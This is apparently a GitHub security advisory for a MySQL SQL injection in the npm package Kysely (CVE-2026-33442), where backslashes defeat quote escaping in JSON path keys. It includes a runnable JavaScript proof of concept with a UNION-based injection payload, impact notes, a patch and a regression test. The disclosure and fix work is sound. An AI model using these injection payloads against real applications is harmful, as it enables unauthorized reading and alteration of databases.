# [H] Kysely has a MySQL SQL Injection via Backslash Escape Bypass in non-type-safe usage of JSON path keys.

## Summary
Severity: High
Advisory: GHSA-fr9j-6mvq-frcv
CVE: CVE-2026-33442
CWE: CWE-89
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-03-20
Source: https://github.com/advisories/GHSA-fr9j-6mvq-frcv
Type: github-advisory

## Affected
- npm: `kysely` — affected >=0.28.12 <0.28.14

## Details
## Summary

The `sanitizeStringLiteral` method in Kysely's query compiler escapes single quotes (`'` → `''`) but does not escape backslashes. On MySQL with the default `BACKSLASH_ESCAPES` SQL mode, an attacker can inject a backslash before a single quote to neutralize the escaping, breaking out of the JSON path string literal and injecting arbitrary SQL.

## Details

When a user calls `.key(value)` on a JSON path builder, the value flows through:

1. `JSONPathBuilder.key(key)` at `src/query-builder/json-path-builder.ts:166` stores the key as a `JSONPathLegNode` with type `'Member'`.

2. During compilation, `DefaultQueryCompiler.visitJSONPath()` at `src/query-compiler/default-query-compiler.ts:1609` wraps the full path in single quotes (`'$...'`).

3. `DefaultQueryCompiler.visitJSONPathLeg()` at `src/query-compiler/default-query-compiler.ts:1623` calls `sanitizeStringLiteral(node.value)` for string values (line 1630).

4. `sanitizeStringLiteral()` at `src/query-compiler/default-query-compiler.ts:1819-1821` only doubles single quotes:

```typescript
// src/query-compiler/default-query-compiler.ts:121
const LIT_WRAP_REGEX = /'/g

// src/query-compiler/default-query-compiler.ts:1819-1821
protected sanitizeStringLiteral(value: string): string {
  return value.replace(LIT_WRAP_REGEX, "''")
}
```

The `MysqlQueryCompiler` does not override `sanitizeStringLiteral` — it only overrides `sanitizeIdentifier` for backtick escaping.

**The bypass mechanism:**

In MySQL's default `BACKSLASH_ESCAPES` mode, `\'` inside a string literal is interpreted as an escaped single quote (not a literal backslash followed by a string terminator). Given the input `\' OR 1=1 --`:

1. `sanitizeStringLiteral` sees the `'` and doubles it: `\'' OR 1=1 --`
2. The full compiled path becomes: `'$.\'' OR 1=1 --'`
3. MySQL parses `\'` as an escaped quote character (consuming the first `'` of the doubled pair)
4. The second `'` now terminates the string literal
5. ` OR 1=1 --` is parsed as SQL, achieving injection

The existing test at `test/node/src/sql-injection.test.ts:61-83` only tests single-quote injection (`first' as ...`), which the `''` doubling correctly prevents. It does not test the backslash bypass vector.

## PoC

```javascript
import { Kysely, MysqlDialect } from 'kysely'
import { createPool } from 'mysql2'

const db = new Kysely({
  dialect: new MysqlDialect({
    pool: createPool({
      host: 'localhost',
      user: 'root',
      password: 'password',
      database: 'testdb',
    }),
  }),
})

// Setup: create a table with JSON data
await sql`CREATE TABLE IF NOT EXISTS users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  data JSON
)`.execute(db)

await sql`INSERT INTO users (data) VALUES ('{"role":"admin","secret":"s3cret"}')`.execute(db)

// Attack: backslash escape bypass in .key()
// An application that passes user input to .key():
const userInput = "\\' OR 1=1) UNION SELECT data FROM users -- " // as never

const query = db
  .selectFrom('users')
  .select((eb) =>
    eb.ref('data', '->$').key(userInput as never).as('result')
  )

console.log(query.compile().sql)
// Produces: select `data`->'$.\\'' OR 1=1) UNION SELECT data FROM users -- ' as `result` from `users`
// MySQL interprets \' as escaped quote, breaking out of the string literal

const results = await query.execute()
console.log(results) // Returns injected query results
```

**Simplified verification of the bypass mechanics:**

```javascript
const { Kysely, MysqlDialect } = require('kysely')

// Even without executing, the compiled SQL demonstrates the vulnerability:
const compiled = db
  .selectFrom('users')
  .select((eb) =>
    eb.ref('data', '->$').key("\\' OR 1=1 --" as never).as('x')
  )
  .compile()

console.log(compiled.sql)
// select `data`->'$.\'' OR 1=1 --' as `x` from `users`
//                  ^^ MySQL sees this as escaped quote
//                    ^ This quote now terminates the string
//                      ^^^^^^^^^^^ Injected SQL
```

**Note:** PostgreSQL is unaffected because `standard_conforming_strings=on` (default since 9.1) disables backslash escape interpretation. SQLite does not interpret backslash escapes in string literals. Only MySQL (and MariaDB) with the default `BACKSLASH_ESCAPES` mode are vulnerable.

## Impact

- **SQL Injection:** An attacker who can control values passed to the `.key()` JSON path builder API can inject arbitrary SQL into queries executed against MySQL databases.
- **Data Exfiltration:** Using UNION-based injection, an attacker can read arbitrary data from any table accessible to the database user.
- **Data Modification/Deletion:** If the application's database user has write permissions, stacked queries (when enabled via `multipleStatements: true`) or subquery-based injection can modify or delete data.
- **Full Database Compromise:** Depending on MySQL user privileges, the attacker could potentially execute administrative operations.
- **Scope:** Any application using Kysely with MySQL that passes user-controlled input to `.key()`, `.at()`, or other JSON path builder methods. While this is a specific API usage pattern (justifying AC:H), it is realistic in applications with dynamic JSON schema access or user-configurable JSON field selection.

## Recommended Fix

Escape backslashes in addition to single quotes in `sanitizeStringLiteral`. This neutralizes the bypass in MySQL's `BACKSLASH_ESCAPES` mode:

```typescript
// src/query-compiler/default-query-compiler.ts

// Change the regex to also match backslashes:
const LIT_WRAP_REGEX = /['\\]/g

// Update sanitizeStringLiteral:
protected sanitizeStringLiteral(value: string): string {
  return value.replace(LIT_WRAP_REGEX, (match) => match === '\\' ? '\\\\' : "''")
}
```

With this fix, the input `\' OR 1=1 --` becomes `\\'' OR 1=1 --`, where MySQL parses `\\` as a literal backslash, `''` as an escaped quote, and the string literal is never terminated.

Alternatively, the MySQL-specific compiler could override `sanitizeStringLiteral` to handle backslash escaping only for MySQL, keeping the base implementation unchanged for PostgreSQL and SQLite which don't need it:

```typescript
// src/dialect/mysql/mysql-query-compiler.ts
protected override sanitizeStringLiteral(value: string): string {
  return value.replace(/['\\]/g, (match) => match === '\\' ? '\\\\' : "''")
}
```

A corresponding test should be added to `test/node/src/sql-injection.test.ts`:

```typescript
it('should not allow SQL injection via backslash escape in $.key JSON paths', async () => {
  const injection = `\\' OR 1=1 -- ` as never

  const query = ctx.db
    .selectFrom('person')
    .select((eb) => eb.ref('first_name', '->$').key(injection).as('x'))

  await ctx.db.executeQuery(query)
  await assertDidNotDropTable(ctx, 'person')
})
```

## References
- https://github.com/kysely-org/kysely/security/advisories/GHSA-fr9j-6mvq-frcv
- https://nvd.nist.gov/vuln/detail/CVE-2026-33442
- https://github.com/kysely-org/kysely
